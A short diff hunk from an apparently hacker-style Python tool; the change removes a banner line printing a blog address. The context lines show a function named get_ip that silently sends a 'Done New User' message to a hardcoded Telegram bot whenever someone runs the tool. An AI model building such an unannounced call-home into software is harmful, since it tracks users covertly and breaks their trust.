@@ -10,7 +10,6 @@ def get_ip():
 	f = "Done New User"
 	sens3 = requests.get("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+id1+"&text="+f)
 	os.system("clear")
-	print ("\033[92mWebsite\033[91m:- \033[94mcyberyemen.blogspot.com")
 	op = (""" 
 \033[91m ~~~~~~~~~~~~~~~~~~
 \033[91m| \033[94mWelcom in My tool \033[91m|
